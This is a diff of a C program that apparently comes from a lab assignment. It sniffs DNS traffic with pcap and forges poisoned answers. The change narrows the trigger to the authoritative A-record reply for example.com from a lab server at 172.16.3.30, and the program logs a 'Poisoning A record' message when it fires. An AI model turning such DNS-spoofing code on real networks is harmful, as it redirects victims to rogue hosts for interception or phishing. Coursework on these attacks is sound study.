@@ -1,3 +1,5 @@
+$ cat /tmp/interceptor-tight.c
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -140,7 +142,12 @@ static void packet_handler(u_char *user, const struct pcap_pkthdr *hdr, const u_
         uint16_t dns_id = (dns[0] << 8) | dns[1];
         uint16_t flags  = (dns[2] << 8) | dns[3];
         int is_response = (flags & 0x8000) != 0;
+        int is_aa       = (flags & 0x0400) != 0;
         uint16_t qdcount = (dns[4] << 8) | dns[5];
+        uint16_t ancount = (dns[6] << 8) | dns[7];
+
+        char src_ip_str[INET_ADDRSTRLEN];
+        inet_ntop(AF_INET, &(iph->saddr), src_ip_str, sizeof(src_ip_str));
 
         char qname[256];
         memset(qname, 0, sizeof(qname));
@@ -153,8 +160,17 @@ static void packet_handler(u_char *user, const struct pcap_pkthdr *hdr, const u_
             }
         }
 
-        /* Target match: EXACT match for "example.com" only */
-        if (forge_mode && is_response && strcasecmp(qname, target_qname) == 0 && qtype == 1) {
+        /* Target match: the FINAL authoritative answer only. Exact qname,
+         * qtype A, a response that is itself authoritative (AA=1) and
+         * actually carries an answer (ANCOUNT>0), from the real domain
+         * server (172.16.3.30). Root and TLD referral packets also echo
+         * qname=example.com/qtype=A in their question section during the
+         * resolver's iterative walk, but they are not authoritative and
+         * carry no answer, so this excludes them and targets specifically
+         * the authoritative example.com/A answer the assignment asks for. */
+        if (forge_mode && is_response && is_aa && ancount >= 1 &&
+            strcmp(src_ip_str, "172.16.3.30") == 0 &&
+            strcasecmp(qname, target_qname) == 0 && qtype == 1) {
             printf("[FORGE] Poisoning A record for %s (ID 0x%04x) -> %s\n",
                    qname, dns_id, rogue_ip_str);
             fflush(stdout);
